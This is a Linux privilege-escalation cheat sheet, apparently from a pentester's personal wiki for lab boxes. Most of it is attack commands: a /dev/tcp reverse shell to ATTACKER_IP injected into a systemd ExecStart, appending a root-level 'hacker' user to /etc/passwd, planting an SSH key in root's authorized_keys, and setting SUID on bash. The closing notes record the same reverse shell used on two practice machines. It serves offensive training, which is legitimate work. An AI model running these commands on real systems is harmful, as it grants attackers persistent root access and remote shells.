# Writable Services / Files

Back to [[Linux-PrivEsc-Methodology]]

## Find Writable Service Files
```bash
find / -name "*.service" -writable 2>/dev/null
find / -name "*.timer" -writable 2>/dev/null
ls -la /etc/init.d/
```

## Exploit Writable systemd Service

Modify the service file:
```ini
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```

Restart it:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
```

## Writable /etc/passwd

```bash
ls -la /etc/passwd
```

If writable:
```bash
# Generate password hash
openssl passwd -1 NewPassword

# Add root-level user
echo 'hacker:REDACTED:0:0:root:/root:/bin/bash' >> /etc/passwd

su hacker
# Password: NewPassword
```

## Writable /etc/shadow

If writable (rare):
```bash
# Generate hash
mkpasswd -m sha-512 NewPassword

# Replace root's hash in /etc/shadow
```

## Writable SSH authorized_keys

```bash
ls -la /root/.ssh/ 2>/dev/null
```

If writable:
```bash
# On Kali: generate key
ssh-keygen -t rsa -f /tmp/id_rsa

# On target: add public key
echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys

# On Kali: SSH in as root
ssh -i /tmp/id_rsa root@TARGET_IP
```

## Writable init.d Scripts
```bash
ls -la /etc/init.d/
```
If any are writable and run as root, inject a reverse shell or `chmod +s /bin/bash`.

---

## From Your Boxes

> **SpiderSociety** (PG) — Writable /etc/systemd/system/spiderbackup.service + sudo access to restart it
> - What worked: Edited service file `ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KALI/443 0>&1'` with `User=root`, then `sudo systemctl daemon-reload && sudo systemctl restart spiderbackup.service`
> - Lesson: Writable service file + sudo restart = instant root. Change ExecStart and User=root.

> **Hetemit** (PG) — Writable /etc/systemd/system/pythonapp.service, could only restart via `sudo /sbin/reboot`
> - What worked: Overwrote service file ExecStart with bash reverse shell, then `sudo /sbin/reboot`
> - Lesson: Even without direct service restart perms, sudo reboot/halt/poweroff triggers service restarts on boot.
